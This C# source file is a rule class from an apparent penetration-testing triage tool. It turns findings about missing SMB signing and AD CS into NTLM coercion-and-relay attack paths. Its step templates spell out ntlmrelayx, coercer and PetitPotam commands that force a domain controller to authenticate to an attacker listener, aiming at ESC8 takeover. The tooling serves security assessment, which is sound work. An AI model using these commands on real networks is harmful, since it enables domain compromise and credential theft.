using ZeroDayTriage.Core.Abstractions;
using ZeroDayTriage.Core.Model;

namespace ZeroDayTriage.Reasoning.Rules;

/// <summary>
/// When a relay target has SMB signing disabled and an unconstrained-delegation host (or any
/// coercible machine) exists, authentication coercion (PetitPotam / Coercer) can be relayed —
/// classically to AD CS (ESC8) or LDAP — to escalate. Fuses two findings into one chain.
/// </summary>
public sealed class CoercionRelayRule : IAttackPathRule
{
    public string Id => "AD-COERCE-RELAY";

    public string Description => "Coercible auth + no SMB signing (+ ADCS) -> NTLM relay escalation.";

    public AssetDomain Domain => AssetDomain.ActiveDirectory;

    public IEnumerable<AttackPath> Evaluate(FindingCorpus findings)
    {
        var relayTargets = findings.WithTag("relay-target").ToList();
        if (relayTargets.Count == 0)
        {
            yield break;
        }

        var hasAdcs = findings.HasTag("adcs");
        var unconstrained = findings.WithTag("unconstrained-delegation").FirstOrDefault();

        foreach (var target in relayTargets)
        {
            var evidence = new List<string> { target.Id };
            if (unconstrained is not null)
            {
                evidence.Add(unconstrained.Id);
            }

            var steps = new List<AttackStep>
            {
                new()
                {
                    Action = "Stand up a relay listener targeting the unsigned host (or ADCS web enrollment).",
                    Tooling = hasAdcs
                        ? "ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
                        : $"ntlmrelayx.py -t smb://{target.Principal} -smb2support",
                    Phase = KillChainPhase.Exploit,
                    Technique = "T1557.001",
                    EvidenceFindingIds = evidence,
                },
                new()
                {
                    Action = "Coerce authentication from a domain controller / privileged host.",
                    Tooling = "coercer coerce -t <DC> -l <attacker>  # or PetitPotam.py <attacker> <DC>",
                    Phase = KillChainPhase.Exploit,
                    Technique = "T1187",
                    EvidenceFindingIds = evidence,
                },
            };

            yield return new AttackPath
            {
                Name = hasAdcs ? "Coerce + relay to AD CS (ESC8)" : $"Coerce + relay to {target.Principal}",
                Objective = hasAdcs ? "Domain controller takeover via ESC8" : "Privileged relay",
                Domain = AssetDomain.ActiveDirectory,
                Impact = hasAdcs ? Severity.Critical : Severity.High,
                Confidence = Confidence.Probable,
                Rationale = hasAdcs
                    ? $"{target.Principal} lacks SMB signing and AD CS web enrollment is present -> coerce the DC " +
                      "and relay to ESC8 for a DC certificate."
                    : $"{target.Principal} lacks SMB signing -> coerce a privileged host and relay NTLM to it.",
                Steps = steps,
            };
        }
    }
}
